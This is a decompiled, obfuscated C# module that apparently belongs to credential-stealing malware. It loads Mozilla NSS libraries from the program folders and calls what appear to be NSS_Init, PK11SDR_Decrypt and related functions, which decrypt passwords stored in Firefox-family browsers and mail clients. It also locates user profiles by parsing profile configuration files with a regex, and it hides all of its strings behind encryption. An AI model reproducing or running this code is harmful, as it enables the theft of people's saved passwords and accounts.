using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class NXF
{
	public struct D_G
	{
		public int SECItemType;

		public int SECItemData;

		public int SECItemLen;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long ZS_(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long QG();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long EV(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int WYN(ref D_G item, StringBuilder inStr);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int OY(ref D_G data, ref D_G result, int cx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate long DG();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int PBH(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	public delegate int KD(long slot);

	private static IntPtr P_Y_121;

	private static List<IntPtr> OL_122 = new List<IntPtr>();

	private static bool HAT_123 = IntPtr.Size == 8;

	private static bool DYW_124 = ((HAT_123 || W_()) ? true : false);

	public static long QYN()
	{
		//Discarded unreachable code: IL_001a, IL_002d
		//IL_0024: Expected O, but got I4
		return GGF<QG>(P_Y_121, O.I("9qiR5S6203OJpupomzmlGYBoVwEN7YZYBenCc1qcse4="))();
	}

	public static long R_(long CH_276)
	{
		//Discarded unreachable code: IL_001c, IL_002f
		//IL_0026: Expected O, but got I4
		return GGF<KD>(P_Y_121, O.I("jAdLma2ew6Qvby6fRMBsXg=="))(CH_276);
	}

	public static int K_(ref D_G MIL_277, [MarshalAs(UnmanagedType.LPStr)] StringBuilder PFP_278)
	{
		//Discarded unreachable code: IL_004a, IL_005d
		//IL_0054: Expected O, but got I4
		try
		{
			return GGF<WYN>(P_Y_121, O.I("B+N/RQFkGu2YO6MxH/dV7W3joeUpSuYzPENokMgVJhw="))(ref MIL_277, PFP_278);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			int result = GGF<WYN>(P_Y_121, O.I("B+N/RQFkGu2YO6MxH/dV7X7YyFfupP99LJ7epjJbH9c="))(ref MIL_277, PFP_278);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static int XO(ref D_G RIB_279, ref D_G ALY_280, int ZET_281)
	{
		//Discarded unreachable code: IL_001d, IL_0030
		//IL_0027: Expected O, but got I4
		return GGF<OY>(P_Y_121, O.I("qJSVk96Qey0WdrAUSNJg0g=="))(ref RIB_279, ref ALY_280, ZET_281);
	}

	public static long DWC()
	{
		//Discarded unreachable code: IL_001a, IL_002d
		//IL_0024: Expected O, but got I4
		return GGF<DG>(P_Y_121, O.I("LuWyIFCDCuF8qt5hIAIh6A=="))();
	}

	public static long HBT(long LRS_282, bool ZQC_283, long LX_284)
	{
		//Discarded unreachable code: IL_001d, IL_0030
		//IL_0027: Expected O, but got I4
		return GGF<EV>(P_Y_121, O.I("/ydWcFn/aGP7xvuifXSMkkyueVXcgJt0dgv6fS78qok="))(LRS_282, ZQC_283, LX_284);
	}

	[DllImport("kernel32.dll", EntryPoint = "LoadLibrary")]
	public static extern IntPtr KQ(string XJQ_285);

	[DllImport("kernel32.dll", EntryPoint = "FreeLibrary", SetLastError = true)]
	public static extern bool WO(IntPtr DKE_286);

	[DllImport("Kernel32.dll", EntryPoint = "IsWow64Process", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DNS(IntPtr LF_287, ref bool RBL_288);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr IKL(IntPtr ERV_289, string HVG_290);

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, EntryPoint = "SetDllDirectory", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool WH(string YNF_291);

	public static long FM(string DMU_292)
	{
		//Discarded unreachable code: IL_0667, IL_067a
		//IL_0671: Expected O, but got I4
		//IL_0672: Expected O, but got I4
		string text = "";
		if (DYW_124)
		{
			if (File.Exists(Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("9Fwq5E6Dvey1H6zQE11MhHSC8nUa51vWr4jMjoXOSNY=")))
			{
				text = Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("9Fwq5E6Dvey1H6zQE11MhFVgMO1qFXwTreQBtdMvfgs=");
			}
		}
		else if (File.Exists(Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("9Fwq5E6Dvey1H6zQE11MhHSC8nUa51vWr4jMjoXOSNY=")))
		{
			text = Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("9Fwq5E6Dvey1H6zQE11MhFVgMO1qFXwTreQBtdMvfgs=");
		}
		string text2 = "";
		if (DYW_124)
		{
			if (File.Exists(Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("FxWsfrzNcDIT81Dyo3dhvYssCRQ2kmcNMwiZGY0wEE8=")))
			{
				text2 = Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("lF56q5zky7AzkLCpaixSfA==");
			}
		}
		else if (File.Exists(Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("FxWsfrzNcDIT81Dyo3dhvYssCRQ2kmcNMwiZGY0wEE8=")))
		{
			text2 = Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("lF56q5zky7AzkLCpaixSfA==");
		}
		string text3 = "";
		if (DYW_124)
		{
			if (File.Exists(Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("E06REt9VAPtCHVtjawWby5tYkUJJtvTN2lmw9SCJVv8=")))
			{
				text3 = Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("E06REt9VAPtCHVtjawWby8MrCIadDdikehAXKGkRAW4=");
			}
		}
		else if (File.Exists(Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("E06REt9VAPtCHVtjawWby5tYkUJJtvTN2lmw9SCJVv8=")))
		{
			text3 = Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("E06REt9VAPtCHVtjawWby8MrCIadDdikehAXKGkRAW4=");
		}
		string text4 = "";
		if (DYW_124)
		{
			if (File.Exists(Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("7wnCwKatnAoxnrkXr2RtH85SM2yJ5TRTAH4wy4/hx3Q=")))
			{
				text4 = Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("blWo7O2mmiSVXJhvwZDcOA==");
			}
		}
		else if (File.Exists(Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("7wnCwKatnAoxnrkXr2RtH85SM2yJ5TRTAH4wy4/hx3Q=")))
		{
			text4 = Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("blWo7O2mmiSVXJhvwZDcOA==");
		}
		string text5 = "";
		if (DYW_124)
		{
			if (File.Exists(Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("JCgvALEnf0oyT4T7fVoGYw==")))
			{
				text5 = Environment.GetEnvironmentVariable(O.I("v1ESvyVh40NGQiXH0K76/LgZV/aJQOQyGa9DL+fSFJM=")) + O.I("VSWAmDdYB6NcVmc70fU94Q==");
			}
		}
		else if (File.Exists(Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("JCgvALEnf0oyT4T7fVoGYw==")))
		{
			text5 = Environment.GetEnvironmentVariable(O.I("LoA9dOGbii2wNBiiugsoUQ==")) + O.I("VSWAmDdYB6NcVmc70fU94Q==");
		}
		if (Directory.Exists(text))
		{
			WH(text + O.I("FtO3o9x/w+Ole8I84aAzLw=="));
			OL_122.Add(KQ(text + O.I("YXa3+zENlCDh0jOji/pX+Wjp//lgQNwFq3ddEneFAuE=")));
			OL_122.Add(KQ(text + Convert.ToString(O.I("+gypS6vA5bZ3yYq5WB/WSw=="))));
			P_Y_121 = KQ(text + Convert.ToString(O.I("k6Xoio/ntEqFwtffeTecXg==")));
			OL_122.Add(P_Y_121);
			return GGF<ZS_>(P_Y_121, O.I("YeXLprawVXXdavKWeg8a8A=="))(DMU_292);
		}
		if (Directory.Exists(text3))
		{
			WH(text3 + O.I("FtO3o9x/w+Ole8I84aAzLw=="));
			OL_122.Add(KQ(text3 + O.I("YXa3+zENlCDh0jOji/pX+Wjp//lgQNwFq3ddEneFAuE=")));
			OL_122.Add(KQ(text3 + Convert.ToString(O.I("+gypS6vA5bZ3yYq5WB/WSw=="))));
			P_Y_121 = KQ(text3 + Convert.ToString(O.I("k6Xoio/ntEqFwtffeTecXg==")));
			OL_122.Add(P_Y_121);
			return GGF<ZS_>(P_Y_121, O.I("YeXLprawVXXdavKWeg8a8A=="))(DMU_292);
		}
		if (Directory.Exists(text2))
		{
			WH(text2 + O.I("FtO3o9x/w+Ole8I84aAzLw=="));
			OL_122.Add(KQ(text2 + O.I("YXa3+zENlCDh0jOji/pX+Wjp//lgQNwFq3ddEneFAuE=")));
			OL_122.Add(KQ(text2 + Convert.ToString(O.I("+gypS6vA5bZ3yYq5WB/WSw=="))));
			P_Y_121 = KQ(text2 + Convert.ToString(O.I("k6Xoio/ntEqFwtffeTecXg==")));
			OL_122.Add(P_Y_121);
			return GGF<ZS_>(P_Y_121, O.I("YeXLprawVXXdavKWeg8a8A=="))(DMU_292);
		}
		if (Directory.Exists(text4))
		{
			WH(text4 + O.I("FtO3o9x/w+Ole8I84aAzLw=="));
			OL_122.Add(KQ(text4 + O.I("YXa3+zENlCDh0jOji/pX+Wjp//lgQNwFq3ddEneFAuE=")));
			OL_122.Add(KQ(text4 + Convert.ToString(O.I("+gypS6vA5bZ3yYq5WB/WSw=="))));
			P_Y_121 = KQ(text4 + Convert.ToString(O.I("k6Xoio/ntEqFwtffeTecXg==")));
			OL_122.Add(P_Y_121);
			return GGF<ZS_>(P_Y_121, O.I("YeXLprawVXXdavKWeg8a8A=="))(DMU_292);
		}
		if (Directory.Exists(text5))
		{
			WH(text5 + O.I("FtO3o9x/w+Ole8I84aAzLw=="));
			OL_122.Add(KQ(text5 + O.I("YXa3+zENlCDh0jOji/pX+Wjp//lgQNwFq3ddEneFAuE=")));
			OL_122.Add(KQ(text5 + Convert.ToString(O.I("+gypS6vA5bZ3yYq5WB/WSw=="))));
			P_Y_121 = KQ(text5 + Convert.ToString(O.I("k6Xoio/ntEqFwtffeTecXg==")));
			OL_122.Add(P_Y_121);
			return GGF<ZS_>(P_Y_121, O.I("YeXLprawVXXdavKWeg8a8A=="))(DMU_292);
		}
		return 0L;
	}

	public static bool W_()
	{
		//Discarded unreachable code: IL_005d, IL_0063, IL_0076
		//IL_006d: Expected O, but got I4
		//IL_006e: Expected O, but got I4
		if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
		{
			using (Process process = Process.GetCurrentProcess())
			{
				bool RBL_ = default(bool);
				if (!DNS(process.Handle, ref RBL_))
				{
					return false;
				}
				return RBL_;
			}
		}
		return false;
	}

	public static object QC(string XGO_293)
	{
		//Discarded unreachable code: IL_016b, IL_017e
		//IL_0175: Expected O, but got I4
		//IL_0176: Expected O, but got I4
		try
		{
			D_G ALY_ = default(D_G);
			long num = 0L;
			StringBuilder pFP_ = new StringBuilder(XGO_293);
			num = QYN();
			HBT(num, true, 0L);
			D_G MIL_ = default(D_G);
			K_(ref MIL_, pFP_);
			R_(num);
			object left = XO(ref MIL_, ref ALY_, 0);
			if (Operators.ConditionalCompareObjectEqual(left, -1, false))
			{
				return O.I("l44mWBwfES1gccmtWb0vIUVHX5Wr42MkDBVSFv6V4mo=");
			}
			object obj = new byte[checked(ALY_.SECItemLen - 1 + 1)];
			Type typeFromHandle = typeof(Marshal);
			string memberName = O.I("kxeO7l1OeNdp5p453vOQPw==");
			object[] array = new object[4];
			IntPtr intPtr = new IntPtr(ALY_.SECItemData);
			array[0] = intPtr;
			array[1] = RuntimeHelpers.GetObjectValue(obj);
			array[2] = 0;
			array[3] = ALY_.SECItemLen;
			object[] array2 = array;
			bool[] array3 = new bool[4]
			{
				false,
				true,
				false,
				true
			};
			NewLateBinding.LateCall(null, typeFromHandle, memberName, array2, null, null, array3, true);
			if (array3[1])
			{
				obj = RuntimeHelpers.GetObjectValue(array2[1]);
			}
			if (array3[3])
			{
				ALY_.SECItemLen = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[3]), typeof(int));
			}
			return Encoding.UTF8.GetString((byte[])obj);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			object result = O.I("pLWka7Z/GC9u/NWAVkIGpulT/DTUmKZcE1wTpL5b+9w=");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void KC()
	{
		//Discarded unreachable code: IL_004b, IL_005a, IL_006d
		//IL_0064: Expected O, but got I4
		//IL_0065: Expected O, but got I4
		try
		{
			DWC();
			foreach (IntPtr item in OL_122)
			{
				try
				{
					WO(item);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void TF(string PU_294)
	{
		//Discarded unreachable code: IL_000c, IL_001f
		//IL_0016: Expected O, but got I4
		if (FM(PU_294) != 0)
		{
		}
	}

	public static object GVW(string AAL_295)
	{
		//Discarded unreachable code: IL_0261, IL_0274
		//IL_026b: Expected O, but got I4
		//IL_026c: Expected O, but got I4
		string str = "";
		string str2 = "";
		try
		{
			if (Operators.CompareString(AAL_295, O.I("6cIyLhoNRFyEV0Nw9ALDIA=="), false) == 0)
			{
				str = Environment.GetEnvironmentVariable(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("DvM5onZXGFRCccdoZcx0qJHEexm++H7Zl95MpYi5T/o=");
				str2 = new Regex(O.I("DM1NldWlV74zph/BcjN8bxwkTOD1BCm1QNV+eSVEv1Y=")).Match(File.ReadAllText(str + O.I("qIozsxFOuaIj6WrlrqjQJw=="))).Groups[1].Value;
			}
			else if (Operators.CompareString(AAL_295, O.I("6IxD9VMHlLlkNbeqNg4Fhw=="), false) == 0)
			{
				str = Environment.GetEnvironmentVariable(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("pweuSrfCbcBXQf025C8ebkFmZ/6ga8/URrV3n1FIEsU=");
				str2 = new Regex(O.I("DM1NldWlV74zph/BcjN8bxwkTOD1BCm1QNV+eSVEv1Y=")).Match(File.ReadAllText(str + O.I("qIozsxFOuaIj6WrlrqjQJw=="))).Groups[1].Value;
			}
			else if (Operators.CompareString(AAL_295, O.I("kq06D1NC9i9UgDtwJM3oTw=="), false) == 0)
			{
				str = Environment.GetEnvironmentVariable(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("vdcouX98AGy7SmyEBOnjWw==");
				str2 = new Regex(O.I("DM1NldWlV74zph/BcjN8bxwkTOD1BCm1QNV+eSVEv1Y=")).Match(File.ReadAllText(str + O.I("qIozsxFOuaIj6WrlrqjQJw=="))).Groups[1].Value;
			}
			else if (Operators.CompareString(AAL_295, O.I("tmJj5XnYT7IpBWqbz+s17A=="), false) == 0)
			{
				str = Environment.GetEnvironmentVariable(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("ABJc9lhjehNb2RB1t/1A3w==");
				str2 = new Regex(O.I("DM1NldWlV74zph/BcjN8bxwkTOD1BCm1QNV+eSVEv1Y=")).Match(File.ReadAllText(str + O.I("qIozsxFOuaIj6WrlrqjQJw=="))).Groups[1].Value;
			}
			else if (Operators.CompareString(AAL_295, O.I("3OumPHec2+0VtVVli6gLcQ=="), false) == 0)
			{
				str = Environment.GetEnvironmentVariable(O.I("wpLiVRcvFijD3b6RjE29rQ==")) + O.I("lF56q5zky7AzkLCpaixSfA==");
				str2 = new Regex(O.I("DM1NldWlV74zph/BcjN8bxwkTOD1BCm1QNV+eSVEv1Y=")).Match(File.ReadAllText(str + O.I("qIozsxFOuaIj6WrlrqjQJw=="))).Groups[1].Value;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return str + str2 + O.I("FtO3o9x/w+Ole8I84aAzLw==");
	}

	private static T GGF<T>(IntPtr GM_296, string RSW_297)
	{
		//Discarded unreachable code: IL_002c, IL_003f
		//IL_0036: Expected O, but got I4
		T result = default(T);
		try
		{
			result = (T)(object)Marshal.GetDelegateForFunctionPointer(IKL(GM_296, RSW_297), typeof(T));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
